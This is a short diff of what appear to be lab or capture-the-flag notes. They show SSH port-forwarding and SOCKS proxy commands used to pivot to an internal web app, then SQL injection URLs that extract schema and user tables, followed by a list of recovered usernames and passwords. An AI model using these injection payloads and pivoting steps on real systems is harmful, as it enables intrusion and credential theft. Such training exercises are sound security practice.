@@ -34,6 +34,7 @@ made MS socket
 somehow found ip for new box to go to
 $ cat /etc/hosts.allow
 192.168.28.181 is the BestWebApp
+`student@lin-ops:~$ ssh -S /tmp/red red -O forward -D9050`
 `student@lin-ops:~$ ssh -S /tmp/red red -O forward -L 1601:192.168.28.181:80`
 `http://0.0.0.0:1601/pick.php?product=7%20UNION%20SELECT%20table_schema,column_name,table_name%20FROM%20information_schema.columns`
 `http://0.0.0.0:1601/pick.php?product=7%20UNION%20SELECT%20user_id,name,username%20FROM%20siteusers.users`
@@ -41,7 +42,7 @@ found passwords, encoded in rot13
 Aaron - apasswordyPa$$word
 user2 - EaglesIsARE78
 user3 - Bob4THEEapples
-
+Lroth - anotherpassword4THEages
 
 
 
